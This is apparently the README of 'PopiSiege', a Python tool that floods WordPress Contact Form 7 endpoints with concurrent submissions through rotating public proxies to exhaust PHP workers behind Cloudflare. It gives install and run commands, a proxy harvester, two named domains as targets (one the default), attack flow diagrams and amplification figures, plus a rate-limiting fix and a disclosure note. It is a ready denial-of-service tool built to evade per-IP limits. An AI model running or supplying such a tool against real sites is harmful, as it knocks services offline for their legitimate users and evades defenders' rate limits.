# PopiSiege

**WordPress Contact Form 7 — WAF Threshold & Worker Exhaustion Research Tool**

> Co-authored by Gurujee & Popi  
> For authorised security research only. Only use on servers you own or have written permission to test.

---

## What It Does

PopiSiege sends concurrent CF7 form submissions through rotating proxies to measure:
- PHP worker pool exhaustion threshold
- WAF (Wordfence/Cloudflare) rate limiting effectiveness
- CDN cache bypass behaviour (`cf-cache-status: DYNAMIC`)
- Server availability under concurrent load

**Key finding:** CF7 REST API (`/wp-json/contact-form-7/v1/feedback`) always bypasses Cloudflare CDN cache — every POST hits the origin server directly, regardless of Cloudflare being in front.

---

## Install

```bash
git clone https://github.com/orospor/PopiSiege.git
cd PopiSiege
pip3 install -r requirements.txt
```

---

## Quick Start

**Step 1 — Get working proxies:**
```bash
python3 proxy_tester.py
```

**Step 2 — Run the test:**
```bash
python3 popisiege.py
```

Press `Ctrl+C` to stop. Final report prints automatically.

---

## Usage

```bash
# Default target (metoo-shatkin.com), auto concurrency
python3 popisiege.py

# Different target
python3 popisiege.py --target metoo-buffalo.com

# Custom concurrency
python3 popisiege.py --concurrency 30

# Verbose — see every request + proxy used
python3 popisiege.py --verbose

# Delay between bursts (seconds)
python3 popisiege.py --delay 1

# Custom proxy file
python3 popisiege.py --proxy-file /path/to/proxies.txt

# Full example
python3 popisiege.py --target metoo-buffalo.com --concurrency 25 --verbose
```

---

## Proxy Tester

Fetches from 3 public proxy sources, tests all in parallel, saves working ones:

```bash
python3 proxy_tester.py
python3 proxy_tester.py --output /tmp/proxies.txt --workers 300 --timeout 10
```

---

## How It Works

```
Attacker (proxy pool)
    │
    ├── Proxy 1 ──► POST /wp-json/cf7/.../feedback ──► Cloudflare ──► LiteSpeed ──► PHP Worker 1
    ├── Proxy 2 ──► POST /wp-json/cf7/.../feedback ──► Cloudflare ──► LiteSpeed ──► PHP Worker 2
    ├── ...
    └── Proxy N ──► POST /wp-json/cf7/.../feedback ──► Cloudflare ──► LiteSpeed ──► PHP Worker N (FULL)
                                                                                     ↓
                                                                               Queue overflow
                                                                               522/524 errors
                                                                               Site degraded
```

- `cf-cache-status: DYNAMIC` — Cloudflare never caches POST requests, always forwards to origin
- Each CF7 submission occupies a PHP worker for ~1.2s minimum
- At 19+ concurrent → worker pool exhausted → legitimate users get 522/524

---

## Key Research Findings

| Finding | Value |
|---------|-------|
| PHP worker limit (metoo-shatkin.com) | 19 workers |
| Body size limit | 8.00 MB (400 error), 7.99 MB (200 OK) |
| Minimum attack payload | 167 bytes — plain CF7 form, no file |
| Wordfence block page size | 7.2 KB vs 200 byte success response |
| Amplification ratio | ~35,000:1 (input bytes : server processing cost) |
| reCAPTCHA protection | Email only — PHP worker still occupied regardless |
| CDN cache status | DYNAMIC on every POST — always hits origin |

---

## The Fix

**Cloudflare Rate Limiting Rule:**
```
Field:    URI Path contains /wp-json/contact-form-7
AND
Field:    Request Method equals POST

Action:   Block
Rate:     5 requests per 10 seconds per IP
```

This stops the attack at Cloudflare's edge — PHP never loads, zero origin cost.

---

## Disclosure

Discovered during security research — June 2026  
Affects: WordPress + Contact Form 7 v6.1.6 + LiteSpeed + Cloudflare stack  
Status: Pending responsible disclosure to CF7 team, Wordfence, Cloudflare
